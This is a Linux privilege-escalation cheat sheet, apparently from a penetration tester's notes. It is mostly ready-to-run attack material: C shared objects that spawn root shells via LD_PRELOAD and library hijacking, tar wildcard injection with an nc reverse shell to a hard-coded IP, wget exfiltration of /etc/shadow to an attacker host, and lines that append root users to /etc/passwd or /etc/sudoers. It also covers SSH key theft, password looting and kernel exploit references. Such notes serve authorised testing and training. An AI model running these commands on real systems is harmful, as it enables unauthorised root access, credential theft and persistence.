# Linux/Unix

## Enumerate Users

```bash
whoami
id
cat /etc/passwd
```

## Services/Processes Running

```bash
ps aux
ps aux | grep root
```

## History

```bash
history
```

## Network Information

```bash
#list the TCP/IP configuration of every network adapter
ip a
# display network routing tables
/sbin/route(l)
route
ip route
# display active network connections and listening ports
netstat -ano
ss -anp 
arp -a
ip neigh
```

## Looting for passwords

#### Files containing passwords

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

#### Last edited files

Files that were edited in the last 10 minutes

```bash
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

#### In memory passwords

```bash
strings /dev/mem -n10 | grep -i PASS
```

#### Find sensitive files

```bash
locate password | more           
locate pwd| more
locate pass | more 
```

## SSH Key

#### Sensitive files

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
...
```

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```bash
lojique@htb[/htb]$ vim id_rsa
lojique@htb[/htb]$ chmod 600 id_rsa
lojique@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```

## Scheduled tasks

#### Cron jobs

Check if you have access with write permission on these files.\
Check inside the file, to find other paths with write permissions.

```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.

```bash
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 
```

## SUDO

```bash
sudo su -
```

Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)

### NOPASSWD

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

If `LD_PRELOAD` is explicitly defined in the sudoers file

```bash
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

{% hint style="danger" %}
A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
{% endhint %}

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

If you find some weird binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**. To do so you can execute:

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.

Create the file _/home/user/.config/libcalc.c_ with the code:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile it using:

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

And execute the binary.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

If you get an error such as

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

that means that the library you have generated need to have a function called `a_function_name`.

#### CVE-2019-14287

{% embed url="https://www.exploit-db.com/exploits/47502" %}

Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, _despite being explicitly prevented from doing so_. It is worth noting that this will _only_ work if you've been granted non-root sudo permissions for the command

```bash
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## Sudo Shell Escaping

#### nmap

```bash
sudo nmap --interactive
nmap> !sh
```

#### vim

```bash
sudo vim -c ':!/bin/sh'
```

#### nano

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

## SUID

SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.

```bash
╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```

#### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### wget

{% embed url="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" %}

This article explains perfectly how we can take advantage of this by adding a user to our /etc/passwd file and uploading it to the victim machine via wget, thus replacing its existing file

```bash
openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/usr/bin/bash
```

You can also abuse this by using wget to transfer a file to your local machine

```bash
# on victim machine
sudo wget --post-file=/etc/shadow http://[ATTACKER IP]:8081
# on kali
nc -lnvp 8081
```

#### apache2

You can get a shell or edit system files, but you can _**view** _ them

```
sudo apache2 -f /etc/shadow
```

## Create a SUID binary

| Function   | Description                                             |
| ---------- | ------------------------------------------------------- |
| setreuid() | sets real and effective user IDs of the calling process |
| setuid()   | sets the effective user ID of the calling process       |
| setgid()   | sets the effective group ID of the calling process      |

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

## Writable files

List world writable files on the system.

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Writable /etc/passwd

{% embed url="https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/" %}

First generate a password with one of the following commands.

```bash
openssl passwd -1 -salt hacker hacker
openssl passwd newPassword
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```bash
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.\
WARNING: you might degrade the current security of the machine.

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

### Writable /etc/sudoers

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Tar Wildcard

#### **Tar Wildcard Injection (1st method)**

```bash
echo "mkfifo /tmp/lhennp; nc 192.168.45.5 443 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar * 
```

#### **Tar Wildcard Injection (2st method)**

```bash
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

sudo -l
sudo bash
whoami
```

#### Tar Wildcard Injection (3rd method)

```bash
echo "chmod u+s /usr/bin/find" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami
```

#### Resources

{% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}

## Docker

{% embed url="https://flast101.github.io/docker-privesc/" %}

{% embed url="https://gtfobins.github.io/gtfobins/docker/" %}

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Restricted Shell

{% embed url="https://0xffsec.com/handbook/shells/restricted-shells/" %}

Example:

```bash
vim
:set shell=/bin/bash
:shell
export PATH=/bin:/usr/bin or export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games
```

## Kernel Exploits

The following exploits are known to work well, search for more exploits with `searchsploit -w linux kernel centos`.

Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing

```bash
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
lscpu
```

Copy the kernel version and distribution, and search for it in google or in [https://www.exploit-db.com/](https://www.exploit-db.com/).

#### CVE-2022-0847 (DirtyPipe)

Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11

```bash
https://www.exploit-db.com/exploits/50808
```

#### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

{% embed url="https://www.exploit-db.com/exploits/40839" %}

```c
// Compile with:
gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
"./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
```

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

#### CVE-2010-3904 (RDS)

Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```
https://www.exploit-db.com/exploits/15285/
```

#### CVE-2010-4258 (Full Nelson)

Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)

```
https://www.exploit-db.com/exploits/15704/
```

#### CVE-2012-0056 (Mempodipper)

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

{% embed url="https://www.exploit-db.com/exploits/18411" %}

{% embed url="https://www.exploit-db.com/exploits/35161" %}

```bash
 gcc mempodipper.c -o mempodipper
 ./mempodipper
```

## Automated Resources

{% embed url="https://github.com/rebootuser/LinEnum.git" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

